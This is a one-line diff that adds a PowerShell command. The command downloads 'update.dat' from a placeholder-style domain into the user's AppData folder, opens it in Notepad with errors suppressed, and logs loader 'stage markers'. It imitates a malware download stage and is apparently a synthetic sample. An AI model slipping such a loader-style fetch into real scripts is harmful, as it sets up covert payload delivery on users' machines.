@@ -1,0 +1,1 @@
+try { (New-Object System.Net.WebClient).DownloadFile('https://adatum.com/update.dat', "$env:APPDATA\update.dat"); Start-Process -FilePath "notepad.exe" -ArgumentList "$env:APPDATA\update.dat" -ErrorAction SilentlyContinue; Write-Verbose "stage marker 16 reached" } catch { Write-Warning "Loader step failed" }
